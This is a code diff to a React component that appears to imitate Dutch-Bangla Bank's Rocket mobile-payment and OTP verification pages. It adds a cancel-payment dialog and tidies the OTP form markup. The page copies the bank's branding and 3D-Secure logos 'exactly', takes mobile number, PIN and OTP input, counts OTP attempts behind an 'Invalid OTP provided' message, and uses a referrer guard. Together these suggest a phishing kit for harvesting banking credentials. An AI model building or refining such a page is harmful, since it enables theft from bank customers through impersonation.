@@ -6,6 +6,7 @@ import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import dbblHeader from "@/assets/dbbl-header.jpg";
 import secureLogos from "@/assets/3d-secure-logos.jpg";
 import otpIllustration from "@/assets/otp-illustration.jpg";
+import CancelPaymentDialog from "@/components/CancelPaymentDialog";
 
 const RocketPayment = () => {
   const navigate = useNavigate();
@@ -24,6 +25,7 @@ const RocketPayment = () => {
   const [showFailed, setShowFailed] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
   const [otpAttempts, setOtpAttempts] = useState(0);
+  const [showCancelDialog, setShowCancelDialog] = useState(false);
 
   const mobileRef = useRef<HTMLInputElement>(null);
   const pinRef = useRef<HTMLInputElement>(null);
@@ -132,6 +134,9 @@ const RocketPayment = () => {
   };
 
   const handleBack = () => {
+    setShowCancelDialog(true);
+  };
+  const handleConfirmCancel = () => {
     navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
   };
 
@@ -188,47 +193,33 @@ const RocketPayment = () => {
   // OTP Page (matches second screenshot exactly)
   if (showOtp) {
     return (
+    <>
     <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
-          {/* Colored line under header */}
           <div className="flex h-[2px]">
             <div className="flex-1 bg-[#0044aa]"></div>
             <div className="flex-1 bg-[#cc0000]"></div>
             <div className="flex-1 bg-[#009933]"></div>
             <div className="flex-1 bg-[#0044aa]"></div>
           </div>
-
           <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
             <p className="text-[11px] min-[375px]:text-xs text-[#333] leading-relaxed mb-3" style={{ fontFamily: 'Arial, sans-serif' }}>
               An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
             </p>
-
             <hr className="border-[#ddd] mb-3" />
-
             <div className="flex items-center gap-2 mb-3">
               <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap" style={{ fontFamily: 'Arial, sans-serif' }}>
                 OTP (One Time Password):
               </label>
-              <input
-                ref={otpRef}
-                type="text"
-                inputMode="numeric"
-                value={otp}
-                onChange={handleOtpChange}
+              <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange}
                 className="border border-[#999] px-1.5 py-0.5 text-xs w-[90px] focus:outline-none focus:border-[#0066cc]"
-                style={{ fontFamily: 'Arial, sans-serif' }}
-              />
+                style={{ fontFamily: 'Arial, sans-serif' }} />
             </div>
-
-            {/* Go button + error inline */}
             <div className="relative flex items-center justify-center mb-4">
-              <button
-                onClick={handleOtpSubmit}
-                disabled={isSubmitting}
+              <button onClick={handleOtpSubmit} disabled={isSubmitting}
                 className="border border-[#999] bg-[#f0f0f0] px-2 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight shrink-0"
-                style={{ fontFamily: 'Arial, sans-serif', height: '20px' }}
-              >
+                style={{ fontFamily: 'Arial, sans-serif', height: '20px' }}>
                 <span className="font-bold text-[#333]">Go</span>
                 <span className="bg-red-600 text-white text-[9px] font-bold px-0.5 leading-none">&gt;</span>
               </button>
@@ -236,15 +227,14 @@ const RocketPayment = () => {
                 <span className="absolute left-[calc(50%+40px)] text-red-600 text-[10px] min-[375px]:text-xs font-medium whitespace-nowrap">Invalid OTP provided.</span>
               )}
             </div>
-
-            {/* OTP illustration */}
             <div className="flex justify-center">
               <img src={otpIllustration} alt="OTP Verification" className="w-full max-w-[400px] h-auto border border-[#ccc]" loading="lazy" />
             </div>
           </div>
         </div>
-
       </div>
+      <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={handleConfirmCancel} />
+    </>
     );
   }
 
@@ -385,7 +375,7 @@ const RocketPayment = () => {
 
         {footer}
       </div>
-
+      <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={handleConfirmCancel} />
     </div>
   );
 };
